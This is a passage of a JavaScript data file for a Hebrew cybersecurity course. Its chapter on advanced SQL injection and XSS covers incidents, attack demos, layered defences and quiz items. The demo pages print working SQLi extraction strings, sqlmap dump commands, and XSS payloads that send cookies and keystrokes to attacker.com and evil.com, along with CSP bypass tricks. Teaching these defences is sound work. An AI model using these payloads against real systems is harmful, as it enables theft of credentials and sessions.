            content: "ב-2015 ו-2016, רוסיה ניתקה חשמל באוקראינה דרך מתקפת סייבר — 230,000 תושבים בלי חשמל בחורף. ב-2021, מתקפת ransomware על Colonial Pipeline גרמה למחסור דלק בחוף המזרחי של ארה\"ב. תשתיות קריטיות הפכו ליעד מספר 1 במלחמת סייבר בין מדינות."
          }
        ]
      }
    ]
  },

  // ============================================================
  // Chapter 110: SQL Injection ו־XSS — מעמיק
  // ============================================================
  {
    id: 110,
    title: "SQL Injection ו־XSS — מעמיק",
    pages: [
      {
        type: "story",
        title: "Sony PSN — 77 מיליון חשבונות, נשק אחד: SQL Injection",
        content: `<div dir="rtl">
<div class="scenario-box scenario-hack">
  <p><strong>תרחיש:</strong> אפריל 2011. שרתי Sony PlayStation Network נכנסים ל-maintenance. הם לא יחזרו ל-23 יום.</p>
</div>

<p>מה ש-Sony לא אמרה מיד: תוקפים השתמשו ב-<code>SQL Injection</code> — אחת הטכניקות הבסיסיות ביותר — כדי לחדור למסד הנתונים. מה שמצאו שם: 77 מיליון חשבונות משתמשים. שמות, כתובות, מיילים, תאריכי לידה, ו — כן — פרטי כרטיסי אשראי.</p>

<div class="stat-highlight"><span class="stat-number">77M</span><span class="stat-unit">חשבונות משתמשים נחשפו</span></div>

<p>Sony הייתה אחת מחברות הטכנולוגיה הגדולות בעולם. צוותי IT. תקציבי אבטחה. וחולשה בסיסית שסטודנט שנה ב' יכול לנצל הרסה את הכול.</p>

<div class="warning-box"><strong>הנזק:</strong> 23 ימי השבתה מלאה. $171 מיליון עלות ישירה. תביעות ייצוגיות. שם שנפגע לשנים. ה-CEO התנצל בשידור חי בטלוויזיה יפנית.</div>

<div class="incident-timeline">
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">2008</div><div class="timeline-desc"><strong>Heartland Payment Systems</strong> — 130 מיליון כרטיסי אשראי דרך SQLi</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">2011</div><div class="timeline-desc"><strong>Sony PSN</strong> — 77 מיליון חשבונות, 23 ימי השבתה</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">2015</div><div class="timeline-desc"><strong>TalkTalk</strong> — 157,000 לקוחות, SQLi בסיסי</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">2017</div><div class="timeline-desc"><strong>Equifax</strong> — 147 מיליון אמריקאים, מידע פיננסי מלא</div></div>
</div>

<p>בפרק הזה נצלול לעומק הטכניקות המתקדמות של SQLi ו-XSS, ונלמד איך מגנים נכון.</p>
</div>`
      },
      {
        type: "demo",
        title: "Advanced SQLi — UNION, Blind, Time-based",
        content: `<div dir="rtl">
<p><strong>מעבר ל-<code>OR 1=1</code> — טכניקות שתוקפים אמיתיים משתמשים בהן</strong></p>

<p><strong>1. <span class="phase-badge phase-red">UNION-based</span> Extraction — שליפת נתונים ממסד</strong></p>

<div class="attack-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>מציאת מספר עמודות</strong><p>ORDER BY 1--, ORDER BY 2--, ORDER BY 3-- (error!) = 2 עמודות</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>זיהוי עמודות מוצגות</strong><p>UNION SELECT 'test1','test2'--</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>שליפת שמות טבלאות</strong><p>UNION SELECT table_name,NULL FROM information_schema.tables--</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>שליפת הנתונים</strong><p>UNION SELECT username,password FROM users--</p></div></div>
</div>

<div class="code-preview"><pre><code># שלב 1: כמה עמודות יש בשאילתה?
' ORDER BY 1-- (ok)
' ORDER BY 2-- (ok)
' ORDER BY 3-- (error!) --> 2 עמודות

# שלב 5: שליפת הנתונים עצמם
' UNION SELECT username,password FROM users--
# --> admin:$2b$12$LJ3m... (bcrypt hash)</code></pre></div>

<p><strong>2. <span class="phase-badge phase-gold">Blind Boolean</span> SQLi — שאלות כן/לא</strong></p>

<div class="code-preview"><pre><code># כשאין output גלוי, שואלים שאלות בינאריות:
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=60--
# אם הדף נטען רגיל = TRUE (אורך הסיסמה 60)
# אם הדף שונה = FALSE

# שליפה תו-תו:
' AND (SELECT SUBSTRING(password,1,1) FROM users
  WHERE username='admin')='$'--
# TRUE! האות הראשונה היא $</code></pre></div>

<p><strong>3. <span class="phase-badge phase-blue">Time-based</span> Blind SQLi — מדידת זמן</strong></p>

<div class="code-preview"><pre><code># כשגם אין הבדל בתצוגה:
' AND IF((SELECT LENGTH(password) FROM users
  WHERE username='admin')=60, SLEEP(3), 0)--
# אם עבר 3 שניות = TRUE
# אם מיידי = FALSE</code></pre></div>

<div class="warning-box"><strong>אזהרה חינוכית:</strong> טכניקות אלה מוצגות ללמידה בלבד. שימוש בהן ללא הרשאה מפורשת הוא עבירה פלילית. תרגלו רק על פלטפורמות מורשות כמו <code>DVWA</code>, <code>WebGoat</code>, או <code>PortSwigger Academy</code>.</div>
</div>`
      },
      {
        type: "demo",
        title: "SQLMap — ניצול אוטומטי של SQL Injection",
        content: `<div dir="rtl">
<div class="tool-card">
  <div class="tool-card-icon">🔧</div>
  <div class="tool-card-body"><strong>SQLMap</strong><p>כלי open-source שמזהה ומנצל SQL Injection אוטומטית. מה שלוקח שעה ידנית — SQLMap עושה בדקות.</p></div>
</div>

<div class="code-preview"><pre><code># סריקה בסיסית — בדיקה אם הפרמטר פגיע
sqlmap -u "http://target.com/search?q=test" --batch

# זיהוי סוג ה-DB
sqlmap -u "http://target.com/search?q=test" --banner
# --> MySQL 8.0.28

# רשימת databases
sqlmap -u "http://target.com/search?q=test" --dbs
# --> information_schema, webapp_db, mysql

# רשימת טבלאות
sqlmap -u "http://target.com/search?q=test" -D webapp_db --tables
# --> users, products, orders, sessions

# שליפת טבלת users
sqlmap -u "http://target.com/search?q=test" -D webapp_db \\
  -T users --dump
# --> id | username | password_hash | email | ...

# פיצוח hash-ים (אם חלשים)
sqlmap -u "http://target.com/search?q=test" -D webapp_db \\
  -T users --dump --passwords</code></pre></div>

<p><strong>יכולות מתקדמות:</strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">💻</div><div class="mini-card-title">--os-shell</div><div class="mini-card-desc">מקבל shell על השרת (אם יש הרשאות)</div></div>
  <div class="mini-card"><div class="mini-card-icon">🛡️</div><div class="mini-card-title">--tamper</div><div class="mini-card-desc">עוקף WAF עם טכניקות encoding</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔥</div><div class="mini-card-title">--level 5 --risk 3</div><div class="mini-card-desc">בדיקות אגרסיביות יותר</div></div>
  <div class="mini-card"><div class="mini-card-icon">📝</div><div class="mini-card-title">--forms</div><div class="mini-card-desc">סורק טפסים אוטומטית</div></div>
</div>

<div class="key-point"><strong>נקודת מפתח:</strong> אם SQLMap מוצא את החולשה — תוקף אמיתי בטוח יכול גם. הכלי הזה מדגים למה <code>Prepared Statements</code> הם לא אופציונליים — הם חובה מוחלטת.</div>
</div>`
      },
      {
        type: "explanation",
        title: "מניעת SQLi — הגנה בשכבות",
        content: `<div dir="rtl">
<p><strong>Prepared Statements הם ההגנה מספר 1 — אבל לא היחידה</strong></p>

<p><strong>שכבה 1: <span class="phase-badge phase-green">Prepared Statements</span> (Parameterized Queries)</strong></p>
<p>השאילתה מקומפלת לפני הכנסת הנתונים. הנתונים מטופלים כ-data, לא כ-code — ולכן לא יכולים לשנות את מבנה השאילתה.</p>

<div class="vs-container">
  <div class="vs-card vs-bad"><h4>❌ קוד פגיע</h4>
    <p><strong>Python:</strong> <code>f"SELECT * FROM u WHERE name='{inp}'"</code></p>
    <p><strong>Java:</strong> <code>"SELECT ... '" + input + "'"</code></p>
    <p><strong>PHP:</strong> <code>"SELECT ... '$_POST[x]'"</code></p>
    <p><strong>Node.js:</strong> <code>"SELECT ... " + req.body.x</code></p>
  </div>
  <div class="vs-card vs-good"><h4>✅ קוד בטוח</h4>
    <p><strong>Python:</strong> <code>"SELECT * FROM u WHERE name=?", (inp,)</code></p>
    <p><strong>Java:</strong> <code>PreparedStatement + setString()</code></p>
    <p><strong>PHP:</strong> <code>PDO prepare() + bindParam()</code></p>
    <p><strong>Node.js:</strong> <code>connection.query("?", [val])</code></p>
  </div>
</div>

<p><strong>שכבה 2: <span class="phase-badge phase-blue">Input Validation</span></strong></p>
<p>אם שדה אמור להכיל מספר — וודאו שזה מספר. אם מייל — בדקו פורמט. <code>Whitelist validation</code> (מה מותר) עדיף על <code>Blacklist</code> (מה אסור).</p>

<p><strong>שכבה 3: <span class="phase-badge phase-gold">WAF</span> (Web Application Firewall)</strong></p>
<p>שכבה נוספת שמזהה patterns של SQLi בבקשות HTTP. לא תחליף ל-Prepared Statements — אבל תתפוס מה שנשמט.</p>

<p><strong>שכבה 4: <span class="phase-badge phase-green">Least Privilege ב-DB</span></strong></p>
<p>אפליקציית Web לא צריכה <code>DROP TABLE</code> או <code>FILE</code> privileges. משתמש DB ייעודי עם הרשאות מינימליות מצמצם נזק גם אם יש פריצה.</p>

<div class="key-point"><strong>נקודת מפתח:</strong> אין פתרון אחד שמספיק. הגנה אמיתית = Prepared Statements + Input Validation + WAF + Least Privilege + Monitoring. כל שכבה שנפרצת — הבאה עוצרת.</div>
</div>`
      },
      {
        type: "demo",
        title: "Advanced XSS — DOM-based ועקיפת CSP",
        content: `<div dir="rtl">
<p><strong>מעבר ל-<code>alert(1)</code> — טכניקות XSS מתקדמות</strong></p>

<p><strong><span class="phase-badge phase-red">DOM-based XSS</span> — הכול קורה בדפדפן</strong></p>

<div class="info-box"><strong>ℹ️ מידע:</strong> בניגוד ל-Reflected/Stored, ב-DOM-based XSS ה-payload לא עובר דרך השרת בכלל.</div>

<div class="code-preview"><pre><code>// קוד JS פגיע באתר:
var search = document.location.hash.substring(1);
document.getElementById("output").innerHTML = search;

// תוקף שולח קישור:
// https://site.com/page#&lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;
// הדפדפן מבצע את הקוד — השרת אף פעם לא ראה את ה-payload!</code></pre></div>

<p><strong><span class="phase-badge phase-red">Cookie Theft</span> בפעולה:</strong></p>

<div class="code-preview"><pre><code>// Stored XSS בשדה תגובה באתר:
&lt;script&gt;
  new Image().src = "https://attacker.com/steal?cookie="
    + encodeURIComponent(document.cookie);
&lt;/script&gt;

// Bypass כש-script tags מסוננים:
&lt;img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)"&gt;
&lt;svg onload="eval(atob('base64_encoded_payload'))"&gt;

// Keylogger injection:
&lt;script&gt;
document.onkeypress = function(e) {
  new Image().src = "https://attacker.com/log?key=" + e.key;
}
&lt;/script&gt;</code></pre></div>

<p><strong><span class="phase-badge phase-gold">CSP Bypass</span> Techniques (לידע הגנתי):</strong></p>

<div class="code-preview"><pre><code>// אם CSP מאפשר 'unsafe-eval':
&lt;script&gt;eval("ale"+"rt(1)")&lt;/script&gt;

// אם CSP מאפשר CDN כמו cdnjs.cloudflare.com:
// תוקף מוצא ספריית JS ב-CDN שמאפשרת eval
// ומשתמש בה כ-"gadget" להרצת קוד

// JSONP endpoint bypass:
&lt;script src="https://allowed-domain.com/api/jsonp?callback=alert"&gt;&lt;/script&gt;</code></pre></div>

<div class="warning-box"><strong>אזהרה:</strong> כמו SQLi, גם XSS הוא עבירה פלילית על מערכות ללא הרשאה. תרגלו ב-<code>PortSwigger Academy</code> (חינם) או <code>DVWA</code>.</div>
</div>`
      },
      {
        type: "explanation",
        title: "הגנה מפני XSS — CSP, Sanitization, HttpOnly",
        content: `<div dir="rtl">
<p><strong>שלוש שכבות הגנה שביחד עוצרות כמעט כל XSS</strong></p>

<p><strong>שכבה 1: <span class="phase-badge phase-green">Output Encoding</span> — מנטרל את ה-payload</strong></p>
<p>כל output שמגיע ממשתמש חייב encoding. במקום <code>&lt;script&gt;</code> יוצג <code>&amp;lt;script&amp;gt;</code> — טקסט רגיל שלא מתבצע.</p>

<table class="content-table">
  <tr><th>Framework</th><th>ברירת מחדל</th><th>מצב מסוכן</th></tr>
  <tr><td>React</td><td><span class="phase-badge phase-green">auto-escape</span></td><td><code>dangerouslySetInnerHTML</code></td></tr>
  <tr><td>Jinja2 (Python)</td><td><span class="phase-badge phase-green">auto-escape</span></td><td>פילטר <code>| safe</code></td></tr>
  <tr><td>Angular</td><td><span class="phase-badge phase-green">auto-sanitize</span></td><td><code>bypassSecurityTrust*</code></td></tr>
  <tr><td>PHP</td><td><span class="phase-badge phase-red">לא מגן!</span></td><td>חובה <code>htmlspecialchars()</code></td></tr>
</table>

<p><strong>שכבה 2: <span class="phase-badge phase-blue">Content Security Policy (CSP)</span></strong></p>
<p>Header שאומר לדפדפן: "הרץ JavaScript רק ממקורות שאני מאשר."</p>

<div class="code-preview"><pre><code># CSP חזק:
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-a1b2c3d4';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;

# בHTML, רק scripts עם הnonce ירוצו:
&lt;script nonce="a1b2c3d4"&gt;console.log("allowed")&lt;/script&gt;
&lt;script&gt;alert("blocked by CSP!")&lt;/script&gt;</code></pre></div>

<p><strong>שכבה 3: <span class="phase-badge phase-green">HttpOnly + Secure + SameSite</span> Cookies</strong></p>

<div class="code-preview"><pre><code># Cookie שמוגן מ-XSS:
Set-Cookie: session=abc123;
  HttpOnly;    # JS לא יכול לגשת
  Secure;      # רק ב-HTTPS
  SameSite=Strict;  # לא נשלח ב-cross-site requests</code></pre></div>

<div class="key-point"><strong>נקודת מפתח:</strong> <code>HttpOnly</code> לא מונע XSS — הוא מונע את הנזק הנפוץ ביותר (גניבת cookies). תוקף עם XSS עדיין יכול לשנות את הדף, להוסיף טפסים מזויפים, או להקליט הקשות. לכן כל השכבות ביחד חשובות.</div>

<div class="chapter-summary"><h4>סיכום הפרק</h4><ul>
<li>SQL Injection מנוצל דרך UNION, Blind Boolean, ו-Time-based — כולם נעצרים ע"י Prepared Statements</li>
<li>XSS מגיע ב-3 וריאנטים: Reflected, Stored, DOM-based — ההגנה: Output Encoding + CSP + HttpOnly</li>
<li>הגנה בשכבות (Defense in Depth) היא הגישה הנכונה — אין פתרון קסם אחד</li>
<li>תרגול על DVWA ו-PortSwigger Academy — הדרך הטובה ביותר ללמוד</li>
</ul></div>
</div>`
      },
      {
        type: "questions",
        title: "שאלות — SQLi ו-XSS מתקדם",
        titleEn: "Advanced SQLi & XSS Questions",
        questions: [
          {
            q: "מה ההבדל בין UNION-based SQLi ל-Blind SQLi, ומתי תוקף ישתמש בכל אחד?",
            a: "UNION-based SQLi מוסיף שאילתה שהתוצאה שלה מוצגת ישירות בדף — עובד כשיש output גלוי.\n\nBlind SQLi משמש כשאין output: Boolean Blind שואל שאלות כן/לא (האם הדף משתנה?), ו-Time-based מודד זמן תגובה (SLEEP).\n\nעיקרי:\n- UNION = תוצאות גלויות בדף\n- Blind Boolean = שינוי בתצוגה = כן/לא\n- Time-based = שינוי בזמן תגובה\n\nטיפ:\nאם אתה רואה output — UNION. אם לא — Blind.",
            qEn: "What is the difference between UNION-based and Blind SQLi?",
            aEn: "UNION-based adds a query whose results are displayed directly on the page.\n\nMain Points:\n- Blind SQLi is used when there is no visible output\n- Boolean Blind asks yes/no questions based on page changes\n- Time-based measures response delays (SLEEP)\n\nTip:\nVisible output = UNION. No output = Blind."
          },
          {
            q: "למה Prepared Statements מונעים SQL Injection?",
            a: "Prepared Statements מפרידים בין מבנה השאילתה לנתונים. השאילתה מקומפלת קודם, והנתונים מוכנסים כפרמטרים נפרדים.\n\nהתוקף לא יכול לשנות את מבנה השאילתה — כי המבנה כבר נקבע לפני שהנתונים הגיעו.\n\nעיקרי:\n- השאילתה מקומפלת -> הנתונים נכנסים כ-data\n- גם אם הקלט הוא ' OR 1=1 — הוא מטופל כטקסט, לא כקוד SQL\n\nטיפ:\nזה כמו טופס מודפס: אתה ממלא שדות, אבל לא יכול לשנות את השאלות.",
            qEn: "Why do Prepared Statements prevent SQL Injection?",
            aEn: "Prepared Statements separate the query structure from the data.\n\nMain Points:\n- The query is compiled first, then data is inserted as parameters\n- Even if input is ' OR 1=1, it is treated as text, not SQL code\n\nTip:\nThink of a printed form: you fill in fields but cannot change the questions."
          },
          {
            q: "מה ההבדל בין Reflected XSS, Stored XSS, ו-DOM-based XSS?",
            a: "Reflected: ה-payload מגיע ב-URL ומוחזר מיד בתגובה. דורש שהקורבן ילחץ על קישור.\n\nStored: ה-payload נשמר במסד הנתונים ומוצג לכל מבקר. מסוכן יותר — לא דורש קישור.\n\nDOM-based: ה-payload מטופל ב-JavaScript בדפדפן, מבלי שהשרת רואה אותו בכלל.\n\nעיקרי:\n- Reflected = דרך URL, חד-פעמי\n- Stored = נשמר ב-DB, פוגע בכולם\n- DOM-based = רק בדפדפן, השרת לא מעורב\n\nטיפ:\nStored הוא הכי מסוכן כי הוא אוטומטי ופוגע בכל מבקר.",
            qEn: "What is the difference between Reflected, Stored, and DOM-based XSS?",
            aEn: "Reflected: payload in URL, echoed immediately. Requires victim to click a link.\n\nMain Points:\n- Stored: payload saved in DB, runs on every visitor\n- DOM-based: payload processed in browser JS, server never sees it\n\nTip:\nStored is most dangerous because it is automatic and affects all visitors."
          },
          {
            q: "מהו CSP (Content Security Policy) וכיצד הוא מגן מ-XSS?",
            a: "CSP הוא HTTP header שמגדיר לדפדפן מאילו מקורות מותר לטעון scripts, styles, ומשאבים.\n\nלדוגמה: script-src 'self' אומר 'הרץ JavaScript רק מהדומיין שלי.' גם אם תוקף הזריק script tag — הדפדפן לא יריץ אותו כי המקור לא מאושר.\n\nעיקרי:\n- CSP מגביל מאיפה הדפדפן טוען קוד\n- nonce-based CSP: רק scripts עם nonce ייחודי ירוצו\n- CSP לא מונע DOM-based XSS — שם הקוד כבר בדף\n\nטיפ:\nCSP הוא שכבת הגנה נוספת, לא תחליף ל-output encoding.",
            qEn: "What is CSP and how does it protect against XSS?",
            aEn: "CSP is an HTTP header that tells the browser which sources are allowed to load scripts and resources.\n\nMain Points:\n- script-src 'self' means only run JS from your own domain\n- Even injected script tags are blocked if the source is not approved\n- CSP does not prevent DOM-based XSS\n\nTip:\nCSP is an additional defense layer, not a replacement for output encoding."
          },
          {
            q: "מדוע HttpOnly cookie לבד לא מספיק נגד XSS?",
            a: "HttpOnly מונע מ-JavaScript לקרוא את ה-cookie. זה חוסם cookie theft — אבל XSS יכול לעשות הרבה יותר.\n\nתוקף עם XSS יכול: לשנות את תוכן הדף, להוסיף טופס התחברות מזויף, להקליט הקשות, לבצע פעולות בשם המשתמש (CSRF-like), ולהפנות לאתר זדוני.\n\nעיקרי:\n- HttpOnly = מגן מגניבת cookies בלבד\n- XSS עם HttpOnly = התוקף לא גונב session, אבל שולט בדף\n- צריך גם Output Encoding + CSP + Input Validation\n\nטיפ:\nHttpOnly הוא רשת ביטחון, לא הגנה ראשית.",
            qEn: "Why is HttpOnly cookie alone not enough against XSS?",
            aEn: "HttpOnly prevents JavaScript from reading the cookie, blocking cookie theft.\n\nMain Points:\n- But XSS can still modify the page, inject fake forms, log keystrokes, and perform actions as the user\n- You also need Output Encoding + CSP + Input Validation\n\nTip:\nHttpOnly is a safety net, not the primary defense."
          }
        ]
      }
    ]
  }
];
